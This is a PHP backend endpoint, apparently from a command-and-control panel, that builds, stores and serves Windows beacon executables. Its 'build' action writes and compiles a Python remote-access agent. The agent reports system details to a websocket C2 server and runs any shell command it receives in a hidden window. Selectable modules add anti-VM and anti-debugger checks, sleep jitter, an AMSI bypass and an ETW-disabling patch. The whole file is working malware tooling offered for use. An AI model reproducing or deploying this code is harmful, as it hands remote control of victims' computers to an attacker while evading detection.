<?php

require_once __DIR__ . '/../includes/auth_middleware.php';
require_once __DIR__ . '/../includes/config.php';
require_once __DIR__ . '/../includes/functions.php';

session_start();
requireAuth();

header('Content-Type: application/json');

$payloadsDir = __DIR__ . '/../data/payloads';
if (!file_exists($payloadsDir)) {
    mkdir($payloadsDir, 0755, true);
}

$jsonData = json_decode(file_get_contents('php://input'), true) ?? [];
$action = $_GET['action'] ?? $jsonData['action'] ?? '';

switch ($action) {
    case 'list':
        $payloads = [];
        foreach (glob($payloadsDir . '/*.exe') as $file) {
            $name = basename($file);
            $payloads[] = [
                'name' => $name,
                'size' => filesize($file),
                'created' => date('Y-m-d H:i:s', filemtime($file))
            ];
        }
        usort($payloads, fn($a, $b) => strtotime($b['created']) - strtotime($a['created']));
        jsonResponse(['payloads' => $payloads]);
        break;

    case 'download':
        $name = basename($_GET['name'] ?? '');
        $file = $payloadsDir . '/' . $name;
        if (file_exists($file) && pathinfo($file, PATHINFO_EXTENSION) === 'exe') {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . $name . '"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
        jsonResponse(['error' => 'File not found'], 404);
        break;

    case 'delete':
        $name = basename($jsonData['name'] ?? '');
        $file = $payloadsDir . '/' . $name;
        if ($name && file_exists($file) && pathinfo($file, PATHINFO_EXTENSION) === 'exe') {
            unlink($file);
            jsonResponse(['success' => true]);
        } else {
            jsonResponse(['error' => 'File not found'], 404);
        }
        break;

    case 'build':
        $data = json_decode(file_get_contents('php://input'), true) ?? $_POST;
        $serverIp = $data['ip'] ?? '127.0.0.1';
        $serverPort = $data['port'] ?? '8080';
        $evasions = $data['evasions'] ?? [];
        $customName = preg_replace('/[^a-zA-Z0-9_-]/', '', $data['name'] ?? '');
        $beaconName = ($customName ? $customName : 'beacon_' . date('Ymd_His')) . '.exe';

        // Build evasion code snippets
        $evasionImports = "";
        $evasionChecks = "";
        $evasionMethods = "";

        // Anti-VM Detection
        if (in_array('anti_vm', $evasions)) {
            $evasionImports .= "import ctypes\nimport winreg\n";
            $evasionMethods .= <<<'EVASION'

    def check_vm(self):
        """Detect virtual machine environments"""
        vm_indicators = [
            ('HARDWARE\\Description\\System', 'SystemBiosVersion', ['VBOX', 'VMWARE', 'QEMU', 'VIRTUAL']),
            ('SOFTWARE\\VMware, Inc.\\VMware Tools', None, None),
            ('SOFTWARE\\Oracle\\VirtualBox Guest Additions', None, None),
        ]
        for key_path, value_name, keywords in vm_indicators:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                if value_name:
                    val, _ = winreg.QueryValueEx(key, value_name)
                    if keywords and any(k in str(val).upper() for k in keywords):
                        return True
                else:
                    return True
            except:
                pass
        # Check for VM-specific processes
        vm_procs = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe']
        try:
            output = subprocess.check_output('tasklist', shell=True, text=True).lower()
            if any(p in output for p in vm_procs):
                return True
        except:
            pass
        return False

EVASION;
            $evasionChecks .= "        if self.check_vm(): return\n";
        }

        // Anti-Debug Detection
        if (in_array('anti_debug', $evasions)) {
            $evasionImports .= "import ctypes\n";
            $evasionMethods .= <<<'EVASION'

    def check_debugger(self):
        """Detect debugger presence"""
        try:
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                return True
            # Remote debugger check
            is_debugged = ctypes.c_bool()
            kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_debugged))
            if is_debugged.value:
                return True
        except:
            pass
        # Check for analysis tools
        debug_procs = ['ollydbg.exe', 'x64dbg.exe', 'ida.exe', 'ida64.exe', 'windbg.exe', 'processhacker.exe', 'procmon.exe', 'wireshark.exe']
        try:
            output = subprocess.check_output('tasklist', shell=True, text=True).lower()
            if any(p in output for p in debug_procs):
                return True
        except:
            pass
        return False

EVASION;
            $evasionChecks .= "        if self.check_debugger(): return\n";
        }

        // Sleep Obfuscation
        if (in_array('sleep_obf', $evasions)) {
            $evasionImports .= "import random\n";
            $evasionMethods .= <<<'EVASION'

    def obfuscated_sleep(self, base_seconds):
        """Sleep with jitter to evade behavioral analysis"""
        jitter = random.uniform(0.5, 1.5)
        actual_sleep = base_seconds * jitter
        # Split sleep into chunks
        chunks = random.randint(3, 7)
        for _ in range(chunks):
            time.sleep(actual_sleep / chunks)
            # Small random operation to break timing patterns
            _ = sum(range(random.randint(1000, 5000)))

EVASION;
        }

        // AMSI Bypass (Windows-specific)
        if (in_array('amsi_bypass', $evasions)) {
            $evasionImports .= "import ctypes\n";
            $evasionMethods .= <<<'EVASION'

    def bypass_amsi(self):
        """Attempt to bypass AMSI"""
        try:
            if platform.system() != "Windows":
                return
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            # Get AmsiScanBuffer address
            AmsiScanBuffer = ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleA(b"amsi.dll"),
                b"AmsiScanBuffer"
            )
            if AmsiScanBuffer:
                # Write return 0 (AMSI_RESULT_CLEAN) patch
                old_protect = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(
                    AmsiScanBuffer, 6, 0x40, ctypes.byref(old_protect)
                )
                patch = (ctypes.c_char * 6)(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
                ctypes.memmove(AmsiScanBuffer, patch, 6)
        except:
            pass

EVASION;
            $evasionChecks .= "        self.bypass_amsi()\n";
        }

        // ETW Bypass
        if (in_array('etw_bypass', $evasions)) {
            $evasionImports .= "import ctypes\n";
            $evasionMethods .= <<<'EVASION'

    def bypass_etw(self):
        """Disable ETW logging"""
        try:
            if platform.system() != "Windows":
                return
            ntdll = ctypes.windll.ntdll
            EtwEventWrite = ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll"),
                b"EtwEventWrite"
            )
            if EtwEventWrite:
                old_protect = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(
                    EtwEventWrite, 1, 0x40, ctypes.byref(old_protect)
                )
                patch = (ctypes.c_char * 1)(0xC3)  # ret
                ctypes.memmove(EtwEventWrite, patch, 1)
        except:
            pass

EVASION;
            $evasionChecks .= "        self.bypass_etw()\n";
        }

        // String Encryption (compile-time obfuscation hint)
        if (in_array('string_encrypt', $evasions)) {
            $evasionImports .= "import base64\n";
            $evasionMethods .= <<<'EVASION'

    def decrypt_str(self, encoded):
        """Decrypt base64 encoded strings at runtime"""
        try:
            return base64.b64decode(encoded).decode('utf-8')
        except:
            return encoded

EVASION;
        }

        // Prepare sleep call
        $sleepCall = in_array('sleep_obf', $evasions) ? 'self.obfuscated_sleep(RECONNECT_DELAY)' : 'time.sleep(RECONNECT_DELAY)';
        $heartbeatSleep = in_array('sleep_obf', $evasions) ? 'self.obfuscated_sleep(HEARTBEAT_INTERVAL)' : 'time.sleep(HEARTBEAT_INTERVAL)';

        $beaconCode = <<<PYTHON
import socket
import platform
import subprocess
import threading
import time
import json
import os
import uuid
{$evasionImports}
try:
    import websocket
except ImportError:
    pass

C2_SERVER = "ws://{$serverIp}:{$serverPort}"
RECONNECT_DELAY = 5
HEARTBEAT_INTERVAL = 30

class Beacon:
    def __init__(self):
        self.agent_id = self.get_agent_id()
        self.ws = None
        self.running = True
        self.connected = False
{$evasionMethods}
    def get_agent_id(self):
        id_file = os.path.join(os.environ.get('TEMP', '/tmp'), '.beacon_id')
        if os.path.exists(id_file):
            with open(id_file, 'r') as f:
                return f.read().strip()
        agent_id = str(uuid.uuid4())[:8]
        try:
            with open(id_file, 'w') as f:
                f.write(agent_id)
        except:
            pass
        return agent_id

    def get_system_info(self):
        hostname = socket.gethostname()
        try:
            ip = socket.gethostbyname(hostname)
        except:
            ip = "127.0.0.1"
        return {
            "hostname": hostname,
            "ip": ip,
            "os": f"{platform.system()} {platform.release()}",
            "username": os.environ.get('USERNAME', os.environ.get('USER', 'unknown'))
        }

    def execute_command(self, command):
        try:
            if platform.system() == "Windows":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=120, startupinfo=startupinfo)
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=120)
            output = result.stdout + result.stderr
            return output.strip() if output.strip() else "[No output]"
        except subprocess.TimeoutExpired:
            return "[Command timed out]"
        except Exception as e:
            return f"[Error: {str(e)}]"

    def send(self, data):
        if self.ws and self.connected:
            try:
                self.ws.send(json.dumps(data))
            except:
                pass

    def on_message(self, ws, message):
        try:
            data = json.loads(message)
            if data.get('type') == 'execute_command':
                result = self.execute_command(data.get('command', ''))
                self.send({'type': 'command_result', 'command_id': data.get('command_id', ''), 'db_command_id': data.get('db_command_id', 0), 'result': result})
        except:
            pass

    def on_open(self, ws):
        self.connected = True
        self.send({'type': 'agent_register', 'agent_id': self.agent_id, **self.get_system_info()})
        def heartbeat():
            while self.running and self.connected:
                {$heartbeatSleep}
                self.send({'type': 'agent_heartbeat', 'agent_id': self.agent_id})
        threading.Thread(target=heartbeat, daemon=True).start()

    def on_close(self, ws, close_status_code, close_msg):
        self.connected = False

    def on_error(self, ws, error):
        self.connected = False

    def connect(self):
        while self.running:
            try:
                import websocket
                self.ws = websocket.WebSocketApp(C2_SERVER, on_message=self.on_message, on_open=self.on_open, on_close=self.on_close, on_error=self.on_error)
                self.ws.run_forever()
            except ImportError:
                pass
            except:
                pass
            if self.running:
                {$sleepCall}

    def run(self):
{$evasionChecks}        self.connect()

if __name__ == "__main__":
    Beacon().run()
PYTHON;

        $tempDir = sys_get_temp_dir() . '/nexus_build_' . uniqid();
        mkdir($tempDir, 0755, true);
        file_put_contents($tempDir . '/beacon.py', $beaconCode);

        // Detect Python
        $python = 'python';
        exec('which python3', $out, $ret);
        if ($ret === 0 && !empty($out[0])) {
            $python = trim($out[0]);
        } else {
             exec('which python', $out2, $ret2);
             if ($ret2 === 0 && !empty($out2[0])) {
                 $python = trim($out2[0]);
             }
        }

        $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        
        if ($isWindows) {
             $buildCmd = "cd /d \"$tempDir\" && $python -m PyInstaller --onefile --noconsole --clean --name beacon beacon.py 2>&1";
        } else {
             $debugPath = getenv('PATH') . ":/usr/local/bin:/home/" . exec('whoami') . "/.local/bin";
             $buildCmd = "export PATH=\"$debugPath\" && cd \"$tempDir\" && $python -m PyInstaller --onefile --noconsole --clean --name beacon beacon.py 2>&1";
        }
        
        $descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = proc_open($buildCmd, $descriptors, $pipes, $tempDir);
        
        $buildOutput = "";
        $buildErrors = "";
        $buildCode = -1;

        if (is_resource($process)) {
            $buildOutput = stream_get_contents($pipes[1]);
            $buildErrors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $buildCode = proc_close($process);
        } else {
            $buildErrors = "Failed to spawn process";
        }

        $debug = [
            'user' => exec('whoami'),
            'php_version' => phpversion(),
            'python_detected' => $python,
            'evasions_selected' => $evasions,
            'cmd' => $buildCmd,
            'temp_dir' => $tempDir,
            'path_env' => getenv('PATH')
        ];

        $logDir = __DIR__ . '/../data/logs';
        if (!file_exists($logDir)) mkdir($logDir, 0777, true);
        file_put_contents($logDir . '/build.log', 
            date('c') . " CMD: $buildCmd\nCODE: $buildCode\nOUT: $buildOutput\nERR: $buildErrors\nDBG: " . json_encode($debug) . "\n\n", 
            FILE_APPEND
        );

        $exePath = $tempDir . '/dist/beacon.exe';
        
        if (file_exists($exePath)) {
            copy($exePath, $payloadsDir . '/' . $beaconName);
            
            @array_map('unlink', glob($tempDir . '/dist/*'));
            @array_map('unlink', glob($tempDir . '/build/*'));
            @array_map('unlink', glob($tempDir . '/*.*'));
            @rmdir($tempDir . '/dist');
            @rmdir($tempDir . '/build');
            @rmdir($tempDir);
            
            jsonResponse([
                'success' => true,
                'name' => $beaconName,
                'message' => 'Beacon built with ' . count($evasions) . ' evasion technique(s)'
            ]);
        } else {
            jsonResponse([
                'error' => 'Build failed',
                'details' => "Exit Code: $buildCode\n\nOutput:\n$buildOutput\n\nErrors:\n$buildErrors",
                'debug' => $debug
            ], 200);
        }
        break;

    default:
        jsonResponse(['error' => 'Invalid action'], 400);
}
